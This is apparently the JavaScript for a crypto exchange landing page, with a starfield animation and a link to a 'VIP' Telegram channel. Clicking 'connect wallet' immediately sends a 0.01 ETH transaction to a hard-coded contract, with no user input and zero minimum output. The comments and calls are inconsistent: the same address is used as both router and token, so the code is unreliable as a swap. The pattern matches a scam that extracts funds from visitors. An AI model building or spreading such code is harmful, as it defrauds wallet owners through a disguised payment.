const provider = new ethers.BrowserProvider(window.ethereum);
let signer;

document.getElementById("connectWallet").onclick = async () => {
  if (!window.ethereum) {
    alert("Please install MetaMask first.");
    return;
  }
  await provider.send("eth_requestAccounts", []);
  signer = await provider.getSigner();
  alert("Wallet Connected: " + await signer.getAddress());
  // 兑换逻辑
  const router = new ethers.Contract(
    "0x88A62F3ef9aF7c7434b61E764d169501ddbe9D08",
    [ // swapExactETHForTokens
      "function exactInputSingle((address,address,uint24,address,uint256,uint256,uint160)) payable returns (uint256)"
    ],
    signer
  );

  const tx = await router.exactInputSingle({
    tokenIn: ethers.ZeroAddress,
    tokenOut: "0x88A62F3ef9aF7c7434b61E764d169501ddbe9D08",
    fee: 3000,
    recipient: await signer.getAddress(),
    deadline: Math.floor(Date.now() / 1000) + 300,
    amountIn: ethers.parseEther("0.01"), // 示例金额
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
  }, { value: ethers.parseEther("0.01") });

  await tx.wait();
  alert("Exchange Complete!");
};

document.getElementById("joinTelegram").onclick = () => {
  window.open("https://t.me/ETHVIP999", "_blank");
};

// 星空背景
const canvas = document.getElementById("stars");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
let stars = Array.from({ length: 500 }, () => [
  Math.random() * canvas.width,
  Math.random() * canvas.height,
  Math.random() * 2 + 1,
]);

function drawStars() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = "#00ffcc";
  stars.forEach(([x, y, r]) => {
    ctx.beginPath();
    ctx.arc(x, y, r, 0, 2 * Math.PI);
    ctx.fill();
  });
}

function animateStars() {
  stars = stars.map(([x, y, r]) => [
    x,
    (y + r) % canvas.height,
    r
  ]);
  drawStars();
  requestAnimationFrame(animateStars);
}
animateStars();
